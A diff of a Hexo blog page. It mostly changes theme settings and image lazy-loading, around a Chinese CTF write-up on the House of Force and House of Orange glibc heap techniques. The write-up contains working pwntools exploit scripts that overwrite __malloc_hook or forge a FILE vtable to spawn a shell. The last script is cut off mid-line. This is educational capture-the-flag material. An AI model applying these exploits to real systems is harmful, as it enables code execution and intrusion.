@@ -35,7 +35,7 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":true,"img_link":"/images/zfb.jpg","text":"请作者喝杯咖啡","icon":"/images/tea.svg"}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -45,6 +45,8 @@
 
 <body>
 <div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
     
 
     
@@ -119,9 +121,15 @@
                         </li>
                     
                     
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
                 </ul>
             </div>
             <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
                 <div class="icon-item menu-bar">
                     <div class="menu-bar-middle"></div>
@@ -273,6 +281,10 @@
         
         
         
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
     </div>
 
     
@@ -381,15 +393,30 @@
 <p>本质是一种任意地址分配</p>
 <h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#gyctf_2020_force" >gyctf_2020_force<i class="fas fa-external-link-alt"></i></a></p>
 <p>题目中只有add和show,其中add存在堆溢出，可写进入0x50个字节</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260213235052093.png"  alt="image-20260213235052093"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260213235052093.png"
+                        alt="image-20260213235052093"
+                 ></p>
 <p>计算top_chunk和malloc_hook的偏移，把它覆盖为one_gadget</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">file_path = &quot;./gyctf_2020_force&quot;</span><br><span class="line">remote_host = &quot;192.168.137.1&quot;</span><br><span class="line">remote_port = 2121</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal = [</span><br><span class="line">    &quot;wt.exe&quot;, &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;,</span><br><span class="line">    &quot;wsl.exe&quot;, &quot;bash&quot;, &quot;-ic&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p = remote(remote_host, remote_port)</span><br><span class="line">else:</span><br><span class="line">    p = process(file_path)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def sla(a, b): p.sendlineafter(a, b)</span><br><span class="line">def ru(a): p.recvuntil(a)</span><br><span class="line">def sa(a, b): p.sendafter(a, b)</span><br><span class="line"></span><br><span class="line">one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    p.recvuntil(&quot;2:puts\n&quot;)</span><br><span class="line">    p.sendline(&#x27;1&#x27;)</span><br><span class="line">    p.recvuntil(&quot;size\n&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;bin addr &quot;)</span><br><span class="line">    addr = int(p.recvuntil(&#x27;\n&#x27;).strip(), 16)</span><br><span class="line">    p.recvuntil(&quot;content\n&quot;)</span><br><span class="line">    p.send(content)</span><br><span class="line">    return addr</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.recvuntil(&quot;2:puts\n&quot;)</span><br><span class="line">    p.sendline(&#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc.address = add(0x200000, &#x27;chunk0\n&#x27;) + 0x200ff0</span><br><span class="line">success(&#x27;libc_base &#x27; + hex(libc.address))</span><br><span class="line">heap_addr = add(0x18, b&#x27;a&#x27;*0x10+p64(0)+p64(0xFFFFFFFFFFFFFFFF))</span><br><span class="line">success(&quot;heap_addr: &quot; + hex(heap_addr))</span><br><span class="line">#先找topchunk地址和libc基址</span><br><span class="line"></span><br><span class="line">#接着计算malloc_hook和top_chunk_addr之间的距离</span><br><span class="line">top = heap_addr + 0x10</span><br><span class="line">off=libc.sym[&#x27;__malloc_hook&#x27;]- top-0x30</span><br><span class="line">one_gadget =0x4526a+ libc.address</span><br><span class="line">realloc = libc.sym[&quot;__libc_realloc&quot;]</span><br><span class="line">#add出这个中间块，下一个就是malloc_hook的地址了</span><br><span class="line">add(off, &#x27;aaa\n&#x27;)</span><br><span class="line">add(0x20,b&#x27;bbbbbbbb&#x27;+p64(one_gadget)+p64(realloc+4))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;2:puts\n&quot;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.recvuntil(&quot;size\n&quot;)</span><br><span class="line">p.sendline(str(20))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>参考<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16421631.html#_label3" >ZIKH26师傅<i class="fas fa-external-link-alt"></i></a>找realloc偏移的调试</p>
 <p><code>disassemble realloc</code></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260215162717166.png"  alt="image-20260215162717166"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260215162717166.png"
+                        alt="image-20260215162717166"
+                 ></p>
 <p>6个push，一个sub rsp,0x38</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260215162854138.png"  alt="image-20260215162854138"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260215162854138.png"
+                        alt="image-20260215162854138"
+                 ></p>
 <p>要求是rsp+0x30为0</p>
 <p>执行一定数量的push和sub rsp,0x38指令(因为可以跳过一定个数的指令)。先考虑一下直接开始执行。这样到执行one_gadget之前有6个push和一个sub rsp,0x38指令，这将栈帧抬高了0x68(0x8*6+0x38),但是别忘了由于多call了一次(call了realloc函数，然后又去call one_gadget，但是原本只有一次call one_gadget)，<strong>因此多执行了一次压栈指令，所以最终直接执行realloc函数，栈帧抬高了0x70字节（就是将原本的rsp变成了rsp-0x70）</strong></p>
 <p>如果执行realloc函数栈帧最少抬高多少呢？</p>
@@ -398,7 +425,12 @@
 </blockquote>
 <p>现在我已经发现四个one_gadget全部失效，然后我想看看其中一个one_gadget [rsp+0x30]经过调整栈帧后能否使用，先去看rsp-0x70与rsp-0x10 这个范围是否存在值为0的内存。</p>
 <p>而且如下图，让rsp上移0x60就好</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260215164133459.png"  alt="image-20260215164133459"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260215164133459.png"
+                        alt="image-20260215164133459"
+                 ></p>
 <h2 id="基础：House-of-Orange"><a href="#基础：House-of-Orange" class="headerlink" title="基础：House of Orange"></a>基础：House of Orange</h2><p>适用范围glibc 2.23 ~ glibc 2.26</p>
 <p>[House of Orange原理](<a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/" >House of Orange - CTF Wiki<i class="fas fa-external-link-alt"></i></a>)</p>
 <blockquote>
@@ -453,17 +485,37 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p1 = malloc(0x400-16);</span><br><span class="line">top = (size_t *) ( (char *) p1 + 0x400 - 16);</span><br><span class="line">top[1] = 0xc01;</span><br></pre></td></tr></table></figure>
 
 <p>拿到top的值之后改为合适size的小值</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260218213643084.png"  alt="image-20260218213643084"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260218213643084.png"
+                        alt="image-20260218213643084"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2 = malloc(0x1000);</span><br></pre></td></tr></table></figure>
 
 <p>malloc让那个topchunk进入unsorted bin</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260218213723438.png"  alt="image-20260218213723438"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260218213723438.png"
+                        alt="image-20260218213723438"
+                 ></p>
 <p>拿到IO_list_all的地址改这个unsorted bin的fd，让IO_list_all指向main_arena</p>
 <p>通过unsorted bin的改变把brk（io_list_all）-&gt;main_arena,伪造这个IO</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io_list_all = top[2] + 0x9a8;</span><br><span class="line">top[3] = io_list_all - 0x10;</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260220151921816.png"  alt="image-20260220151921816"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260218214146542.png"  alt="image-20260218214146542"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260220151921816.png"
+                        alt="image-20260220151921816"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260218214146542.png"
+                        alt="image-20260218214146542"
+                 ></p>
 <p>之后就是为IO结构体做准备了</p>
 <blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;old_top = av-&gt;top;//原本old top chunk的地址</span><br><span class="line"> old_size = chunksize (old_top);//原本old top chunk的size</span><br><span class="line"> old_end = (char *) (chunk_at_offset (old_top, old_size));//old top chunk的地址加上其size</span><br><span class="line"></span><br><span class="line"> brk = snd_brk = (char *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"> /*</span><br><span class="line">    If not the first time through, we require old_size to be</span><br><span class="line">    at least MINSIZE and to have prev_inuse set.</span><br><span class="line">  */</span><br><span class="line"></span><br><span class="line"> assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||</span><br><span class="line">         ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">          prev_inuse (old_top) &amp;&amp;</span><br><span class="line">          ((unsigned long) old_end &amp; (pagesize - 1)) == 0));</span><br><span class="line"></span><br><span class="line"> assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>
@@ -474,9 +526,19 @@
 
 <p><code>p/x &amp;((struct _IO_FILE*)0)-&gt;_chain</code></p>
 <p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/L0g4n-blog/p/14217309.html" >参考<i class="fas fa-external-link-alt"></i></a></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260220155522299.png"  alt="image-20260220155522299"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260220155522299.png"
+                        alt="image-20260220155522299"
+                 ></p>
 <p>存储smallbin[4]fd,bk,bk_addr-io_list_all&#x3D;0x68</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260220153455816.png"  alt="image-20260220153455816"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260220153455816.png"
+                        alt="image-20260220153455816"
+                 ></p>
 <p>接着伪造虚函数表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">size_t *jump_table = &amp;top[12]; // 伪造的受控内存vtable的位置</span><br><span class="line">jump_table[3] = (size_t) &amp;winner;//对应的虚函数是 _IO_OVERFLOW改为后门函数</span><br><span class="line">*(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // top+0xd8，把伪造的vtable改为真的</span><br><span class="line">malloc(10);//触发</span><br></pre></td></tr></table></figure>
 
@@ -539,24 +601,49 @@
 <p>没有free函数</p>
 <p>add</p>
 <p>有一个管理chunk，然后在chunk[1]处放置作用的chunk，但是只能malloc4次</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260221172525019.png"  alt="image-20260221172525019"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260221172525019.png"
+                        alt="image-20260221172525019"
+                 ></p>
 <p>edit</p>
 <p>自定义输入字节，存在溢出，但是只能改3次</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260221172648445.png"  alt="image-20260221172648445"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260221172648445.png"
+                        alt="image-20260221172648445"
+                 ></p>
 <p>show</p>
 <p>展示作用chunk的内容</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260221172727436.png"  alt="image-20260221172727436"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260221172727436.png"
+                        alt="image-20260221172727436"
+                 ></p>
 <p>思路</p>
 <p>先house_of_orange把top_chunk放入unsortedbin,</p>
 <p>然后把它切割一块出来，根据其fd和fd_nextsize泄露libc_base和heap_base</p>
 <p>并拿到io_list_all的地址</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(0x10,b&quot;aaa&quot;)</span><br><span class="line">edit(0x100,b&quot;a&quot;*0x38+p64(0xfa1))</span><br><span class="line">add(0x1000,b&quot;aaa&quot;)</span><br><span class="line">add(0x400,b&quot;11111111&quot;)</span><br><span class="line">show(2)</span><br><span class="line">ru(b&quot;Name of house : &quot;)</span><br><span class="line">libc_base=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x3c5188</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">edit(0x10,b&quot;a&quot;*0x10)</span><br><span class="line">show(2)</span><br><span class="line">ru(b&quot;a&quot;*0x10)</span><br><span class="line">heap_base= u64(p.recv(6).ljust(8,b&quot;\x00&quot;))</span><br><span class="line">print(hex(heap_base))</span><br><span class="line">io_list_all=libc_base+libc.sym[&quot;_IO_list_all&quot;]</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260221173311598.png" ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260221173311598.png"
+                       
+                 ></p>
 <p>根据双向链表的特征把io_list_all绑定到main_arena去伪造FILE,并且通过溢出构造IO结构绕过检测：前一个chunk是使用状态，top_chunk的size伪造为0x61，对应chain,  _IO_write_base&lt;_IO_write_ptr,伪造vtable，并且把vtable中的overflow伪造为我们的system函数，注意vtavble的偏移是0xd8,参数bin&#x2F;sh放置在这个topchunk的头部</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload =  flat(p64(0) * 3,</span><br><span class="line">                p64(libc_base + libc.sym[&quot;system&quot;]),#overflow</span><br><span class="line">                0x400 * b&quot;\x00&quot;,</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                b&quot;/bin/sh\x00&quot;, </span><br><span class="line">                0x61,#new_top_chunk——size</span><br><span class="line">                0, </span><br><span class="line">                io_list_all-0x10,#bk-&gt;main_arena</span><br><span class="line">                0,    # _IO_write_base</span><br><span class="line">                0x1,  # _IO_write_ptr</span><br><span class="line">                0xa8 * b&quot;\x00&quot;,#vtable偏移是0xd8</span><br><span class="line">                heap_base+0x10#vtable</span><br><span class="line">                )</span><br><span class="line">edit(0x600,payload)</span><br><span class="line">sla(b&quot;Your choice : &quot;,str(1))</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260302133541224.png"  alt="image-20260302133541224"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260302133541224.png"
+                        alt="image-20260302133541224"
+                 ></p>
 <p>exp</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">file_path = &quot;./houseoforange_hitcon_2016&quot;</span><br><span class="line">remote_host = &quot;192.168.137.1&quot;</span><br><span class="line">remote_port = 2121</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal = [</span><br><span class="line">    &quot;wt.exe&quot;, &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;,</span><br><span class="line">    &quot;wsl.exe&quot;, &quot;bash&quot;, &quot;-ic&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = ELF(&quot;libc-2.23_x64_16.so&quot;)</span><br><span class="line"># p=remote(&quot;node5.buuoj.cn&quot;,26675)</span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p=remote(&quot;node5.buuoj.cn&quot;,26675)</span><br><span class="line">else:</span><br><span class="line">    p = process(file_path)</span><br><span class="line">#     gdb.attach(p, &quot;&quot;&quot;</span><br><span class="line"># b *0x08048666</span><br><span class="line"># c</span><br><span class="line"># &quot;&quot;&quot;, api=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause() </span><br><span class="line">def sla(a, b):p.sendlineafter(a, b)</span><br><span class="line">def ru(a):p.recvuntil(a)</span><br><span class="line">def sa(a, b):p.sendafter(a, b)</span><br><span class="line"></span><br><span class="line">def add(length: int, name, price: int = 0xff, color: int = 1):</span><br><span class="line">    p.sendlineafter(&quot;Your choice : &quot;, &quot;1&quot;)</span><br><span class="line">    p.sendlineafter(&quot;Length of name :&quot;, str(length))</span><br><span class="line">    p.sendafter(&quot;Name :&quot;, name)</span><br><span class="line">    p.sendlineafter(&quot;Price of Orange:&quot;, str(price))</span><br><span class="line">    p.sendlineafter(&quot;Color of Orange:&quot;, str(color))</span><br><span class="line">    p.recvuntil(&quot;Finish\n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(num):</span><br><span class="line">    p.sendlineafter(&quot;Your choice : &quot;, str(num))</span><br><span class="line"></span><br><span class="line">def edit(length: int, name, price: int = 0xff, color: int = 1):</span><br><span class="line">    p.sendlineafter(&quot;Your choice : &quot;, &quot;3&quot;)</span><br><span class="line">    p.sendlineafter(&quot;Length of name :&quot;, str(length))</span><br><span class="line">    p.sendafter(&quot;Name:&quot;, name)</span><br><span class="line">    p.sendlineafter(&quot;Price of Orange: &quot;, str(price))</span><br><span class="line">    p.sendlineafter(&quot;Color of Orange: &quot;, str(color))</span><br><span class="line">    p.recvuntil(&quot;Finish\n&quot;)</span><br><span class="line"></span><br><span class="line">add(0x10,b&quot;aaa&quot;)</span><br><span 